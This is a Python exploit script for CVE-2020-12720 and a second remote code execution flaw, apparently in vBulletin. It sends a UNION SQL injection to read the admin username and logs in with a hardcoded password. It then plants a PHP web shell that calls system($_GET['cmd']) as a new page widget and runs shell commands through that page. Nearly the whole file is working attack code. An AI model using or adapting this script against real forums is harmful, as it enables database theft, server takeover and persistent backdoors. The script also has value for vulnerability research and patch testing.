#!/usr/bin/env python3
'''
        CVE-2020-12720 and 2nd RCE CVE to be claimed
	Copyright 2020 Photubias(c)

        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.
        
        File name CVE-2020-12720+.py
        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be

        This is a native implementation without requirements, written in Python 3.
        Works equally well on Windows as Linux (as MacOS, probably ;-)
        
        ##-->> Full creds to @zenofex and @rekter0 <<--##
'''
import urllib.request, urllib.parse, sys

sADMINPASS = '12345678'
sCMD = 'ls -al /'
sURL = 'http://192.168.50.128/'
iTimeout = 5

import ssl
ssl._create_default_https_context = ssl._create_unverified_context

import http.cookiejar
cj = http.cookiejar.CookieJar()
oOpener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

import random, string
def randomString(stringLength=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def getData(sUrl, lData):
    try:
        oData = urllib.parse.urlencode(lData).encode()
        oRequest = urllib.request.Request(url = sUrl, data = oData)
        return oOpener.open(oRequest, timeout = iTimeout)
    except:
        print('----- ERROR')
        sys.exit(1)

sPageName = randomString()

## Start bij getting admin user:
print('Welcome, first verifying the SQLi (ToDo: implement account takeover)')
sPath = 'ajax/api/content_infraction/getIndexableContent'
lData = {'nodeId[nodeid]' : '1 UNION SELECT 26,25,24,23,22,21,20,19,20,17,16,15,14,13,12,11,10,username,8,7,6,5,4,3,2,1 from user where userid=1--'}
print(getData(sURL + sPath, lData).read().decode())

sPath = 'ajax/activate-sitebuilder'
lData = {'pageid':'1', 'nodeid':'0','userid':'1','loadMenu':'false', 'isAjaxTemplateRender':'true', 'isAjaxTemplateRenderWithData':'true','securitytoken':'1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12'}
oResponse = getData(sURL + sPath, lData)
if not oResponse.code == 200:
    print('Error')
    sys.exit(1)
#print(oResponse.read().decode())

sPath = 'auth/ajax-login'
lData = {'logintype':'cplogin','userid':'1','password':sADMINPASS,'securitytoken':'1589477194-0e3085507fb50fc1631610a28e045c5fa71a2a12'}
oResponse = getData(sURL + sPath, lData)
sResponse = oResponse.read().decode()
sToken = sResponse.split(',')[1].split(':')[1].replace('"','').replace('}','')
print('Got token '+sToken)

## cpsession is needed
#for cookie in cj: print(cookie.name, cookie.value, cookie.domain) #etc etc

sPath = 'ajax/api/widget/saveNewWidgetInstance'
lData = {'containerinstanceid':'0','widgetid':'23','pagetemplateid':'','securitytoken':sToken}
oResponse = getData(sURL + sPath, lData)
sResponse = oResponse.read().decode()
sWidgetInstanceID = sResponse.split(',')[0].split(':')[1].replace('}','')
sPageTemplateID = sResponse.split(',')[1].split(':')[1].replace('}','')
print('WidgetInstanceID: '+sWidgetInstanceID+' and PageTemplateID: '+sPageTemplateID)


sPath = 'ajax/api/widget/saveAdminConfig'
lData = {'widgetid':'23',
         'pagetemplateid':sPageTemplateID,
         'widgetinstanceid':sWidgetInstanceID,
         'data[widget_type]':'',
         'data[title]':sPageName,
         'data[show_at_breakpoints][desktop]':'1',
         'data[show_at_breakpoints][small]':'1',
         'data[show_at_breakpoints][xsmall]':'1',
         'data[hide_title]':'0',
         'data[module_viewpermissions][key]':'show_all',
         'data[code]':"echo('###SHELLRESULT###');system($_GET['cmd']);echo('###SHELLRESULT###');",
         'securitytoken':sToken
         }
oResponse = getData(sURL + sPath, lData)
sResponse = oResponse.read().decode()
#print('Response code is ' + str(oResponse.code))
#print(sResponse)

sPath = 'admin/savepage'
lData = {'input[ishomeroute]':'0',
         'input[pageid]':'0',
         'input[nodeid]':'0',
         'input[userid]':'1',
         'input[screenlayoutid]':'2',
         'input[templatetitle]':sPageName,
         'input[displaysections[0]]':'[{"widgetId":"23","widgetInstanceId":"' + sWidgetInstanceID + '"}]',
         'input[displaysections[1]]':'[]',
         'input[displaysections[2]]':'[]',
         'input[displaysections[3]]':'[]',
         'input[pagetitle]':sPageName,
         'input[resturl]':sPageName,
         'input[metadescription]':'Photubias+Shell',
         'input[pagetemplateid]':sPageTemplateID,
         'url':sURL,
         'securitytoken':sToken
         }
oResponse = getData(sURL + sPath, lData)
sResponse = oResponse.read().decode()
#print('Response code is ' + str(oResponse.code))
#print(sResponse)

sCmd =  urllib.parse.quote(sCMD)
sPath = sPageName+"?cmd="+sCmd

print('Opening '+sURL + sPath)

oRequest = urllib.request.Request(url = sURL + sPath)
oResponse = oOpener.open(oRequest, timeout = iTimeout)
print('#######################')
#print('Response code is ' + str(oResponse.code))
sResponse = oResponse.read().decode()
print('Command result:')
print(sResponse.split('###SHELLRESULT###')[1])
